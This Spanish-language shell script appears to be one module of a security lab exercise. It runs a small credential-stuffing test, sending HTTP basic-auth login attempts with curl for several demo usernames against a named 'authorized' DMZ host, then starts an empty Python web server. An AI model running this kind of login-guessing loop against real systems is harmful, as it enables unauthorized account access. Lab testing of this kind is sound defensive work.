
#!/bin/sh

set -eu

TARGET="${TARGET_DMZ:-https://servidor-web-dmz-smesa.onrender.com}"

echo "========================================"
echo " MODULO 06 - CREDENTIAL STUFFING"
echo "========================================"
echo "Objetivo autorizado: $TARGET"
echo "[INFO] Se utilizaran credenciales ficticias."
echo ""

# Usuarios y contrasenas exclusivamente de demostracion
USUARIOS="admin docente gestor"

for USUARIO in $USUARIOS; do
    echo "[PRUEBA] Usuario: $USUARIO"

    RESPUESTA=$(curl -s -o /dev/null \
        --max-time 15 \
        -w "%{http_code}" \
        -u "$USUARIO:clave_ficticia_2026" \
        "$TARGET/login" || echo "ERROR")

    echo "[RESULTADO] HTTP $RESPUESTA"
    sleep 1
done

echo ""
echo "[INFO] Pruebas de credenciales finalizadas."
echo "[INFO] La DMZ no autentica estas credenciales."
echo "[INFO] Iniciando servicio de estado..."

mkdir -p /tmp/empty

python3 -m http.server "${PORT:-10000}" --bind 0.0.0.0 --directory /tmp/empty
